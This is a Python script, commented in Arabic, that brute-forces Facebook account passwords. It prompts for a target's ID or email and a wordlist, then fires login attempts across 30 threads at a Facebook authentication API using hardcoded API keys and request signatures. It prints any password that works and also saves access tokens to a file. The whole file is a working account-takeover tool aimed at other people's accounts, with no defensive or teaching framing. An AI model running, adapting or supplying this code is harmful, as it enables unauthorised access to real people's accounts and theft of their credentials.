import os
import sys
import time
import json
import random
import hashlib
import requests
import concurrent.futures
from mechanize import Browser

# التأكد من وجود ملف wordlist.txt أو إنشاؤه إذا لم يكن موجودًا
def check_wordlist_file():
    filename = "wordlist.txt"
    if not os.path.isfile(filename):
        print(f"\x1b[1;93m[!] File '{filename}' not found, creating a default one...")
        with open(filename, "w") as file:
            file.write("123456\npassword\nqwerty\nletmein\nhello123\n")
        print(f"\x1b[1;92m[+] '{filename}' created with default passwords.\n")

# إعدادات المتصفح
def setup_browser():
    br = Browser()
    br.set_handle_robots(False)
    br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
    return br

# إغلاق البرنامج
def exit_program():
    print("\033[1;96m[!] \x1b[1;91mExit")
    sys.exit()

# طباعة النص ببطء
def slow_print(text):
    for char in text + '\n':
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.1)

# تسجيل الدخول إلى الفيسبوك
def facebook_login(email, password):
    br = setup_browser()
    try:
        br.open('https://m.facebook.com')
        br.select_form(nr=0)
        br.form['email'] = email
        br.form['pass'] = password
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            return get_access_token(email, password)
        elif 'checkpoint' in url:
            print("\n\x1b[1;92m[!] Your Account is on Checkpoint")
            return None
        else:
            print("\n\x1b[1;93mPassword/Email is wrong")
            return None
    except Exception as e:
        print(f"\n\033[1;96m[!] \x1b[1;91mError: {e}")
        return None

# الحصول على token الوصول
def get_access_token(email, password):
    sig = f'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail={email}format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword={password}return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
    data = {
        "api_key": "882a8490361da98702bf97a021ddc14d",
        "credentials_type": "password",
        "email": email,
        "format": "JSON",
        "generate_machine_id": "1",
        "generate_session_cookies": "1",
        "locale": "en_US",
        "method": "auth.login",
        "password": password,
        "return_ssl_resources": "0",
        "v": "1.0"
    }
    x = hashlib.new("md5")
    x.update(sig.encode())
    data['sig'] = x.hexdigest()
    url = "https://api.facebook.com/restserver.php"
    try:
        r = requests.get(url, params=data)
        z = json.loads(r.text)
        if 'access_token' in z:
            with open("login.txt", 'w') as unikers:
                unikers.write(z['access_token'])
            return z['access_token']
        else:
            print("\n\x1b[1;93mFailed to get access token")
            return None
    except requests.exceptions.ConnectionError:
        print("\n\x1b[1;91m[!] There is no internet connection")
        return None

# اختبار كلمة المرور
def test_password(email, password):
    try:
        data = requests.get(f'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email={email}&locale=en_US&password={password}&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
        mpsh = json.loads(data.text)
        if 'access_token' in mpsh:
            return True, password
        elif 'www.facebook.com' in mpsh.get('error_msg', ''):
            return 'checkpoint', password
        else:
            return False, password
    except requests.exceptions.ConnectionError:
        return 'error', password

# Brute Force Attack
def brute_force(email, wordlist):
    with open(wordlist, 'r') as file:
        passwords = file.readlines()
    print(f'\x1b[1;91m[+] \x1b[1;92mTotal\x1b[1;96m {len(passwords)} \x1b[1;92mPassword')
    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
        future_to_password = {executor.submit(test_password, email, password.strip()): password.strip() for password in passwords}
        for future in concurrent.futures.as_completed(future_to_password):
            result, password = future.result()
            if result is True:
                print(f'\n\x1b[1;91m[+] \x1b[1;92mFounded.')
                print(f'\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m {email}')
                print(f'\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m {password}')
                exit_program()
            elif result == 'checkpoint':
                print(f'\n\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint')
                print(f'\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m {email}')
                print(f'\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m {password}')
                exit_program()

# القائمة الرئيسية
def main_menu():
    check_wordlist_file()  # ← التأكد من وجود الملف أو إنشاؤه
    email = input('\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m/\x1b[1;92mEmail \x1b[1;97mTarget \x1b[1;91m:\x1b[1;97m ')
    wordlist = input('\x1b[1;91m[+] \x1b[1;92mWordlist \x1b[1;97mText(filename.txt) \x1b[1;91m: \x1b[1;97m')
    brute_force(email, wordlist)

if __name__ == '__main__':
    main_menu()
